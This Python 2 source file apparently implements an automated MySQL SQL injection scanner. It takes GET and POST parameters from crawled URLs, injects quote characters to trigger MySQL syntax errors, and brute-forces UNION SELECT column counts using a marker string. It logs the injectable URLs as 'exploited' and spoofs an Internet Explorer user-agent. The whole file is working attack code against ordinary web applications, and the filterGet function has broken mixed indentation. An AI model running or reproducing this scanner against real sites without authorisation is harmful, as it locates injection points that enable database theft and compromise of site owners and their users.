import urllib
import urllib2
import urlparse
import time
import BeautifulSoup

from termcolor import colored, cprint

from functions import *
func = functions()

class MySQLTests:

	def __init__(self):
		self.exploited = {}
		self.geturls = {}
		self.totalVulns = {'UNION':0};
		self.unionstart = 1
		self.unionfinish = 10
		self.injectionurl = ""
		self.headers = { 'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)' }
		self.errorarr = { "'", '"'}
		self.answershow = 1

	def cleanURL(self, url):
		url = url.replace("./", "/");
		return url;

	def cleanPostVars(self, vars):
		postvars = {}
		splitvars = vars.split(",") 
		for vartotal in splitvars:
			varsplit = vartotal.split("=")
			postvars[varsplit[0]] = varsplit[1]
		return postvars

	def postErrorTest(self, url):
		errorfound = False
		spliturl = url.split("|")
		posturl = self.cleanURL(spliturl[0])
		postvars = self.cleanPostVars(spliturl[1])
		urlvalues = urllib.urlencode(postvars)
		for sqlinj in self.errorarr:
			testVars = urlvalues.replace("%5BXX%5D", sqlinj);
			postreq = urllib2.Request(posturl, testVars, self.headers)
			content = urllib2.urlopen(postreq).read()
			if "You have an error in your SQL syntax" in content:
				errorfound = True
		if errorfound:
			print colored("[+] [{1}] MySQL POST Error Found - {0}".format(posturl, func.showTime()), "white", "on_blue")
			return True
		else:
			return False

	def postUnionTest(self, url):
		unionvars = ""
		nullvars = ""
		uniqid = "726486"
		spliturl = url.split("|")
		posturl = self.cleanURL(spliturl[0])
		postvars = self.cleanPostVars(spliturl[1])
		urlvalues = urllib.urlencode(postvars)
		testUrl = urlvalues.replace("%5BXX%5D", "1%20union%20select%20[VARS]");
		for x in range(self.unionstart, self.unionfinish):
			if len(unionvars) > 0:
				unionvars += ","
				nullvars += ","
			unionvars += str(x) + uniqid
			nullvars += "NULL"
			unionurl = testUrl.replace("[VARS]", unionvars)
			nullurl = testUrl.replace("[VARS]", nullvars)
			postreq = urllib2.Request(posturl, unionurl, self.headers)
			content = urllib2.urlopen(postreq).read()
			if uniqid in content:
				self.injectionurl = unionurl.replace(uniqid, "")
				print colored("[+] [{1}] MySQL POST Union Injection Found ({0} columns)".format(x, func.showTime()), "white", "on_blue")
				print unionurl
				self.exploited[nullurl] = x
				self.totalVulns['UNION'] += 1
				return x
		return False

	def getErrorTest(self, url):
		errorfound = False
		testUrl = url.replace("[XX]", "'");
		content = urllib2.urlopen(testUrl).read()
		for sqlinj in self.errorarr:
			testUrl = url.replace("[XX]", sqlinj);
			content = urllib2.urlopen(testUrl).read()
			if "You have an error in your SQL syntax" in content:
				errorfound = True
		if errorfound:
			print colored("[+] [{1}] MySQL GET Error Found - {0}".format(url, func.showTime()), "white", "on_blue")
			return True
		else:
			return False

	def getUnionTest(self, url):
		unionvars = ""
		nullvars = ""
		uniqid = "726486"
		testUrl = url.replace("[XX]", "1%20union%20select%20[VARS]");
		for x in range(self.unionstart, self.unionfinish):
			if len(unionvars) > 0:
				unionvars += ","
				nullvars += ","
			unionvars += str(x) + uniqid
			nullvars += "NULL"
			unionurl = testUrl.replace("[VARS]", unionvars)
			nullurl = testUrl.replace("[VARS]", nullvars)
			content = urllib2.urlopen(unionurl).read()
			if uniqid in content:
				self.injectionurl = unionurl.replace(uniqid, "")
				print colored("[+] [{1}] MySQL GET Union Injection Found ({0} columns)".format(x, func.showTime()), "white", "on_blue")
				self.exploited[nullurl] = x
				self.totalVulns['UNION'] += 1
				return x
		return False

	def filterGet(self, weburls):
		for url in weburls:
			if "?" in url:
				arrayid = ""
				idtotal = 0
				spliturl = url.split("?")
				newurl = spliturl[0]
                splitvars = spliturl[1].split("&")
                if len(splitvars) > 0:
                    for varid in splitvars:
                        if "=" in arrayid:
                            arrayid += "&"
                        splitid = varid.split("=")
                        arrayid += splitid[0]
                        arrayid += "=[XX]"
                        idtotal += 1
                else:
                    arrayid = spliturl[1]
                addurl = newurl + "?" + arrayid
                if format(addurl) not in self.geturls:
                    self.geturls[format(addurl)] = "false"
                #print "[-] GET URL: {0}".format(addurl)
		return self.geturls

	def start(self, level, weburls, inputAnswers):
		cont = False
		self.answershow = inputAnswers
		if self.answershow:
			cont = True
		if int(level) < 1 or int(level) > 5:
			level = 1
		self.unionstart = self.unionstart + (10 * (int(level) - 1))
		self.unionfinish = self.unionfinish + (10 * (int(level) - 1))
		print colored("[+] [{1}] MySQL Level: {0}".format(level, func.showTime()), "cyan")
		testnum = 0
		for url, method in iter(weburls.iteritems()):
			testnum += 1
			print colored("[-] [{1}] [{2}] Performing MySQL Tests :: {0}".format(url, func.showTime(), method), "cyan")
			sqlifound = False
			if method == "GET":
				errortest = self.getErrorTest(url)
				uniontest = self.getUnionTest(url)
				if errortest or uniontest:
					if testnum < len(weburls) and cont != True:
						answer = raw_input(colored("[*] [{0}] Do you want to contune testing other scripts(Y/N)? ".format(func.showTime()), "red"))
						if answer == "N":
							cont = False
							break
						elif answer == "Y":
							cont = True
					#break
			if method == "POST":
				errortest = self.postErrorTest(url)
				uniontest = self.postUnionTest(url)
				if errortest or uniontest:
					if testnum < len(weburls) and cont != True:
						answer = raw_input(colored("[*] [{0}] Do you want to contune testing other scripts(Y/N)? ".format(func.showTime()), "red"))
						if answer == "N":
							cont = False
							break
						elif answer == "Y":
							cont = True
		return self.exploited